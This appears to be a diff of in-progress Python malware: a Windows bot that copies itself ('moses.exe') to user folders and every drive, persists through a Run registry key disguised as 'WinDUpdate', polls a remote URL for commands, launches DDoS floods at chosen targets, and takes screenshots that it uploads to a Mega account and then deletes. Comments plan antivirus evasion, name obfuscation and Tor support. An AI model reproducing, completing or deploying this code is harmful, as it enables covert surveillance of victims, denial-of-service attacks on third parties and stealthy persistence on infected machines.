@@ -1,10 +1,13 @@
-import base64, sys, time, urllib.request, socket, getpass, string, shutil, os, pyautogui, cv2, 
+import base64, sys, time, urllib.request, socket, getpass, string, shutil, os, pyautogui, cv2
 from mega import Mega
 from datetime import datetime
-exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('BASE64 ENCODED PROGRAM GOES HERE')))
+#exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('BASE64 ENCODED PROGRAM GOES HERE')))
 
 # TODO: COMPLETE THE PROGRAM, as it is still under construction and currently incomplete
 # TODO: obfuscate all function and variable names after completion
+# TODO: check anti-virus evasion/efficacy
+# TODO: setup tor capability
+# TODO: convert to subprocesses in the future
 
 # NOTE: READ INSTRUCTIONS BELOW
 #
@@ -17,13 +20,13 @@ exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('
 #
 
 def main():
-    URL = "https://website.tld" #NO SLASH AT THE END OF THE URL
+    URL = "URLTOWEBSITE" #NO SLASH AT THE END OF THE URL
     master_filename = "moses.exe"
 
     sys_username = get_sys_username()
 
-    # user's ~, and user's ~/AppData/Roaming dir
-    path = ["\\", "\\AppData\\Roaming\\",] #ADD EXTRA SAVE PATHS IF NEED BE
+    # TODO: find more paths to store moses.exe in
+    path = ["\\AppData\\Roaming\\", "\\AppData\\local"]
 
     for x in path:
         try:
@@ -33,7 +36,7 @@ def main():
         finally:
             alphabet = list(string.ascii_uppercase)
 
-            # copy master_file to every drive, pass on driver if any error
+            # copy master_file to every drive, pass on drive if error
             for x in alphabet:
                 try:
                     shutil.copyfile(master_filename, x + ":\\" + master_filename)
@@ -41,10 +44,11 @@ def main():
                     pass
 
     for x in path:
-        if (check_if_file_exists_in_path()):
-            # NOTE: i'm not sure if this will create duplicate entries in the registry, or replace if there's a pre-existing entry
-            os.system('REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "WinDUpdate" /t REG_SZ /F /D "' + "C:\\Users\\" + sys_username + x + master_filename + '"')
-            # path reasigned to x (the other paths aren't needed during this session)
+        if (check_if_file_exists_in_path(x, sys_username, master_filename)):
+            # NOTE: i'm not sure if this will create duplicate entries in the registry, or replace if there's a pre-existing entry, so be sure to bug fix this
+            os.system('REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /V "WinDUpdate" /t REG_SZ /F /D "' + "C:\\Users\\" + sys_username + x + master_filename + '"')
+            #NOTE: this isn't needed, but i'll keep it here for now
+            # path reassigned to x (the other paths aren't needed during this session)
             path = x 
             # persistence initiated, so break
             break
@@ -59,11 +63,11 @@ def main():
             target = get_web_content(URL, "2")
             stop_time = get_web_content(URL, "3")
 
-            ddos_target(target, stop_time)
+            ddos_attack(target, stop_time)
         elif (signal == "2"): # screenshot
             take_screenshot(sys_username)
         else:
-            # command not recognized, or page is empty/doesn't exist
+            # command not recognized, or page is empty
             pass
 
         time.sleep(6)
@@ -78,43 +82,44 @@ def get_web_content(URL, wb_path):
         web_content = response.read().decode('utf-8').replace("\n", "")
     except:
         web_content = ""
+
     return web_content
 
 # used for getting system username
 def get_sys_username():
     sys_username = getpass.getuser()
+
     return sys_username
 
 # used for getting current system time
 def get_current_time():
     now = datetime.now()
     current_time = now.strftime("%H:%M") #24-hour clock format
+
     return current_time
 
-# used to verify if file exists in path (returns boolean)
-# TODO: COMPLETE FUNCTION (THIS MAY NOT WORK)
 def check_if_file_exists_in_path(x, sys_username, master_filename):
     file_exists = os.path.isfile("C:\\Users\\" + sys_username + x + master_filename)
+
     return file_exists
 
-# TODO: COMPLETE FUNCTION
-# file_created var is the filename of the var created 
 def upload_file(filename):
     counter = 0
 
     while (True):
         try: 
             mega = Mega()
-            m = mega.login(email, password)
+            #TODO: find a better way than plaintext email and password...
+            m = mega.login("EMAIL", "PASSWORD")
 
-            filename = m.upload(filename)
-            m.get_upload_link(filename)
+            m.upload(filename)
 
-            #TODO: remove file from user system
+            # NOTE: this may not work. bug test this.
+            os.remove(filename)
+
+            break
         except:
-            pass
-        # add 1 to counter each iteration
-        counter += 1
+            counter += 1
 
         if (counter < 30):
             time.sleep(30)
@@ -122,6 +127,7 @@ def upload_file(filename):
             break
 
 #TODO: COMPLETE FUNCTION
+# downloads file to root (master file's) dir from the root mega folder
 def download_file(filename):
     filename = m.find(filename)
     m.download(filename)
@@ -129,9 +135,8 @@ def download_file(filename):
 
 
 ###---COMMAND MODULES---###
-# TODO: COMPLETE FUNCTION
-# TODO: change back to im_living when done (evades antivirus)
-def ddos_target(target, stop_time): # 1
+# NOTEt change back to im_living when done (evades antivirus)
+def ddos_attack(target, stop_time): # 1
     source = str(socket.gethostbyname(socket.gethostname()))
     destination_port = 80
 
@@ -147,21 +152,19 @@ def ddos_target(target, stop_time): # 1
         except:
             pass
 
-# TODO: COMPLETE FUNCTION
+# NOTE: THIS MAY NOT WORK, BUG CHECK THIS
 def take_screenshot(sys_username): # 2
     filename = get_current_time()
-    #NOTE: this may not work
     # example: 1357rethyxyz.png
-    filename = filename.replace(":", "") + sys_username + ".png"
+    filename = str(filename.replace(":", ""))
+    filename = filename + sys_username + ".png"
 
     screenshot = pyautogui.screenshot()
     screenshot.save(filename)
 
-    # upload the file named screen.png
     upload_file(filename)
 
-# TODO: COMPLETE FUNCTION
-# NOTE: i may omit this function in the future
+# NOTE: i may omit this function and opt for screen cap. every second for x amount of time
 #def take_webcam_snapshot():
 #    try:
 #        video_capture = cv2.VideoCapture(0)
